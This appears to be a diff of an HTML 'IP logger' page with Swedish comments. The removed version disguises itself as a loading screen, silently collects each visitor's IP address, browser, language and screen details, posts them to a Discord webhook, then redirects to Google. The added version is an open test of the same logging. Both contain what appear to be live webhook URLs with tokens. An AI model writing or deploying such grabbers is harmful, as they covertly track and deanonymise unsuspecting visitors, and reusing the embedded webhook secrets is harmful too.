@@ -1,85 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
-    <style>
-        body {
-            background: black;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial;
-            margin: 0;
-        }
-        .loader {
-            text-align: center;
-        }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #333;
-            border-top-color: green;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    </style>
+    <title>IP Test</title>
 </head>
 <body>
-    <div class="loader">
-        <div class="spinner"></div>
-        <p>Connecting...</p>
-    </div>
-
+    <h1>Testing IP Logger...</h1>
+    <p>Check Discord in a few seconds.</p>
+    
     <script>
-        // Discord Webhook - ÄNDRA DENNA TILL DIN RIKTIGA URL
-        const WEBHOOK = "https://discord.com/api/webhooks/1486797065760669768/l25TmHpw1Xww2K1Pni_v5OMecNEycTp8oNB_EpSjT6Sp-lkUwHtWVGQ6m9IRCSpP2WY_";
+        // DIN WEBHOOK - ÄNDRA HÄR
+        const WEBHOOK = "https://discord.com/api/webhooks/1486791223199928608/wdF1JEPc9i0podmhHCs6QjqwaWUFux8kO2YYy11bFaEnJ264TVMRXGj1RXXBUrLv7";
         
-        // Hämta IP
-        async function logIP() {
+        async function testLogger() {
             try {
-                // Hämta IP från gratis API
+                console.log("1. Startar logger...");
+                
+                // Hämta IP
+                console.log("2. Hämtar IP...");
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 const ip = data.ip;
-                
-                // Hämta webbläsarinfo
-                const info = {
-                    ip: ip,
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    screen: window.screen.width + "x" + window.screen.height,
-                    time: new Date().toISOString(),
-                    url: window.location.href
-                };
+                console.log("3. IP hämtad:", ip);
                 
                 // Skicka till Discord
-                const message = {
-                    content: `**🎯 NEW VISITOR!**\n**IP:** ${info.ip}\n**Browser:** ${info.userAgent}\n**Language:** ${info.language}\n**Screen:** ${info.screen}\n**Time:** ${info.time}\n**URL:** ${info.url}`
-                };
-                
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(message)
+                console.log("4. Skickar till Discord...");
+                const response = await fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `✅ **TEST FUNGERAR!**\nIP: ${ip}\nTid: ${new Date().toISOString()}`
+                    })
                 });
                 
-            } catch(e) {
-                // Fel - gör inget
+                console.log("5. Discord svarade med status:", response.status);
+                
+                if (response.status === 204) {
+                    console.log("✅ Lyckades! Kolla Discord!");
+                } else {
+                    console.log("❌ Misslyckades. Status:", response.status);
+                }
+                
+            } catch(error) {
+                console.log("❌ FEL:", error.message);
             }
         }
         
-        // Kör och omdirigera
-        logIP().then(() => {
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 2000);
-        });
+        testLogger();
     </script>
 </body>
 </html>
